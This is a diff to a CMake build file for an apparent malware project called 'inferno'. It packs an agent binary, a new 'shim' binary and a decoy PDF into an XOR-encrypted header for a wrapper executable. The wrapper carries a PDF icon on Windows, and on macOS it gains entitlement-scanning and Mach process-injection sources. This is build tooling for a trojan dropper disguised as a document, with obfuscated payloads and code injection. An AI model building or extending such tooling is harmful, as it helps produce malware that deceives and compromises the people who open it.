@@ -16,9 +16,13 @@ set(INFERNO_XOR_KEY "2B7E151628AED2A6")
 if(APPLE)
     set(EMBEDDED_AGENT "$<TARGET_FILE:inferno_agent_dylib>")
     set(EMBEDDED_AGENT_DEP inferno_agent_dylib)
+    set(EMBEDDED_SHIM "$<TARGET_FILE:inferno_shim>")
+    set(EMBEDDED_SHIM_DEP inferno_shim)
 else()
     set(EMBEDDED_AGENT "${CMAKE_BINARY_DIR}/inferno_client${CMAKE_EXECUTABLE_SUFFIX}")
     set(EMBEDDED_AGENT_DEP inferno_client)
+    set(EMBEDDED_SHIM "")
+    set(EMBEDDED_SHIM_DEP "")
 endif()
 
 add_custom_command(
@@ -27,12 +31,14 @@ add_custom_command(
             "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
             "--key" "${INFERNO_XOR_KEY}"
             "${EMBEDDED_AGENT}"
+            "${EMBEDDED_SHIM}"
             "${DECOY_PDF}"
             "${AGENT_BINARY_HEADER}"
     DEPENDS  ${EMBEDDED_AGENT_DEP}
+             ${EMBEDDED_SHIM_DEP}
              "${DECOY_PDF}"
              "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
-    COMMENT "Generating agent_binary.h (XOR-encrypted) from agent binary + decoy PDF"
+    COMMENT "Generating agent_binary.h (XOR-encrypted) from agent binary + shim + decoy PDF"
     VERBATIM
 )
 
@@ -55,6 +61,13 @@ if(WIN32)
     list(APPEND WRAPPER_SOURCES ${WRAPPER_RC} ${PDF_ICO})
 endif()
 
+if(APPLE)
+    list(APPEND WRAPPER_SOURCES
+        ../client/src/EntitlementScanner.cpp
+        ../client/src/MachInjector.cpp
+    )
+endif()
+
 add_executable(inferno_wrapper ${WRAPPER_SOURCES}
     include/unlit.hpp
 )
@@ -62,16 +75,10 @@ add_executable(inferno_wrapper ${WRAPPER_SOURCES}
 target_include_directories(inferno_wrapper PRIVATE
     ${CMAKE_CURRENT_BINARY_DIR}
     ${CMAKE_CURRENT_SOURCE_DIR}/include
+    ${CMAKE_SOURCE_DIR}/client/include
 )
 
-# Embed the full path to inferno_shim so the wrapper can find it
-# via execv() regardless of PATH (which may be corrupted by colons
-# in paths like C:C++ on macOS).
-if(APPLE)
-    target_compile_definitions(inferno_wrapper PRIVATE
-        INFERNO_SHIM_PATH="${CMAKE_BINARY_DIR}/inferno_shim${CMAKE_EXECUTABLE_SUFFIX}"
-    )
-endif()
+
 
 # UNLIT() macro returns a const char* from a lambda — the compiler can't
 # see through it to verify the format string is a literal. The string IS
